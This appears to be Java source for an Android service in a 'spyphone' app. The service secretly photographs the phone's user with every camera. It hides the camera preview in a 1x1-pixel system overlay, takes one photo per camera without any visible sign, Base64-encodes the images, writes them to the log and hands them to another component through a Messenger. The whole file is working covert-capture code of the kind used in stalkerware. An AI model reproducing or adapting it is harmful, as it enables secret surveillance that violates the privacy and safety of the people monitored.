package emit.esy.es.spyphone.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import com.firebase.client.utilities.Base64;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import emit.esy.es.spyphone.interfaces.ServiceResponse;

/**
 * Created by Emil Makovac on 28/04/2015.
 */
public class CameraService extends Service implements ServiceResponse {

    private static final String LOG_TAG = "CameraService";

    ArrayList<String> photos;
    String pictureData;
    Camera camera = null;
    Intent myIntent;
    final int numberOfCameras = Camera.getNumberOfCameras();


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        myIntent = intent;

        final SurfaceView preview = new SurfaceView(this);
        SurfaceHolder holder = preview.getHolder();
        // deprecated setting, but required on Android versions prior to 3.0
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

        holder.addCallback(new SurfaceHolder.Callback() {
            @Override
            //The preview must happen at or after this point or takePicture fails
            public void surfaceCreated(SurfaceHolder holder) {
                Log.d(LOG_TAG, "Surface created");

                if (numberOfCameras == 0)
                    stopSelf();

                photos = new ArrayList<>();
                takePhoto(holder);
            }



            @Override
            public void surfaceDestroyed(SurfaceHolder holder) {
            }

            @Override
            public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
            }
        });


        WindowManager wm = (WindowManager) this
                .getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                1, 1, //Must be at least 1x1
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                0,
                PixelFormat.UNKNOWN);

        wm.addView(preview, params);


        return START_NOT_STICKY;
    }

    int i = 0;
    private void takePhoto(final SurfaceHolder holder) {

        if (camera != null) {
            camera.stopPreview();
            camera.release();
        }
        if (i == numberOfCameras)
            return;

        try {

            camera = Camera.open(i);
            Log.d(LOG_TAG, "Opened camera " + Integer.toString(i));

            camera.setPreviewDisplay(holder);

            camera.startPreview();
            Log.d(LOG_TAG, "Started preview");

            //Starting a new thread for taking pictures
            new Thread() {
                public void run(){
                    Log.d(LOG_TAG, "new Thread - run");
                    try{
                        camera.takePicture(null, null, new Camera.PictureCallback() {

                            @Override
                            public void onPictureTaken(byte[] data, Camera camera) {
                                Log.d(LOG_TAG, "onPictureTaken");
                                //savePicture(data);
                                pictureData = new String(Base64.encodeBytes(data));
                                Log.d("Taken, converted Pic", pictureData);
                                photos.add(pictureData);
                                if(photos.size() == numberOfCameras) {
                                    onWorkDone(myIntent);
                                } else {
                                    takePhoto(holder);
                                }
                            }
                        });
                    } catch (Exception e) {
                        Log.e(LOG_TAG, e.toString());
                        if(i< numberOfCameras ){
                            takePhoto(holder);
                        } else {
                            if (camera != null) {
                                camera.stopPreview();
                                camera.release();
                            }
                            onWorkDone(myIntent);
                        }

                    }
                }
            }.start();
            // end thread

            i++;
            Log.d(LOG_TAG, "Increasing i = " +  Integer.toString(i));

        } catch (Exception e) {
            Log.e(LOG_TAG, e.toString());
            if(i< numberOfCameras -1){
                takePhoto(holder);
            } else {
                if (camera != null) {
                    camera.stopPreview();
                    camera.release();
                }
                onWorkDone(myIntent);
            }

        }
    }

    @Override
    public void onWorkDone(Intent intent) {
        Log.d(LOG_TAG, "onWorkDone");
        Bundle bundle = intent.getExtras();
        Bundle data = new Bundle();
        data.putString("action", "photo");
        data.putStringArrayList("content", photos);
        if (bundle != null) {
            Messenger messenger = (Messenger) bundle.get("messenger");
            Message msg = Message.obtain();
            msg.setData(data);
            try {
                messenger.send(msg);
            } catch (RemoteException e) {
                Log.i("error", "error");
            }
        }
    }

    @Override
    public void onDestroy() {
        Log.d(LOG_TAG, "onDestroy");
        if (camera != null)
            camera.release();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void savePicture(byte[] data) {
        File pictureFile = getOutputMediaFile();
        if (pictureFile == null){
            Log.d(LOG_TAG, "Error creating media file, check storage permissions");
            return;
        }

        try {
            FileOutputStream fos = new FileOutputStream(pictureFile);
            fos.write(data);
            fos.close();
        } catch (FileNotFoundException e) {
            Log.d(LOG_TAG, "File not found: " + e.getMessage());
        } catch (IOException e) {
            Log.d(LOG_TAG, "Error accessing file: " + e.getMessage());
        }
    }

    private File getOutputMediaFile(){
        // To be safe, you should check that the SDCard is mounted
        // using Environment.getExternalStorageState() before doing this.

        File mediaStorageDir = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES), "MyCameraApp");
        // This location works best if you want the created images to be shared
        // between applications and persist after your app has been uninstalled.

        // Create the storage directory if it does not exist
        if (! mediaStorageDir.exists()){
            if (! mediaStorageDir.mkdirs()){
                Log.d("MyCameraApp", "failed to create directory");
                return null;
            }
        }

        // Create a media file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        File mediaFile;

        mediaFile = new File(mediaStorageDir.getPath() + File.separator +
                "IMG_"+ timeStamp + ".jpg");


        return mediaFile;
    }
}
